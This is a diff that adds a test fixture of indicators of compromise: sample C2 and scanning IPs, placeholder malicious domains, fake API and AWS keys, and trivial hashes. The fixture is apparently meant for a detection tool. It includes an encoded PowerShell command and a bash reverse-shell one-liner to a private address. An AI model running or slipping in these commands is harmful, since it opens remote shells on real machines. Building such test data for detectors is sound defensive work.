@@ -1,0 +1,23 @@
+Test file with embedded indicators of compromise.
+
+Suspicious IP addresses found in this file:
+- 203.0.113.50 (known C2 server)
+- 198.51.100.23 (scanning host)
+- 192.168.100.50 (internal pivot)
+
+Malicious domains:
+- evil-domain.net
+- phishing-site.org
+- malicious-c2.example.com
+
+Suspicious commands:
+cmd.exe /c powershell -enc ZGVjb2RlZA==
+bash -i >& /dev/tcp/192.168.100.50/4444 0>&1
+
+API keys (fake for testing):
+API_KEY=sk_test_51H8xJ2KlPqOwNz3DxYzAbCdEfGhIjKlMnOpQrStUvWxYz
+AWS_SECRET=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+
+File hashes of known malware:
+d41d8cd98f00b204e9800998ecf8427e
+5d41402abc4b2a76b9719d911017c592
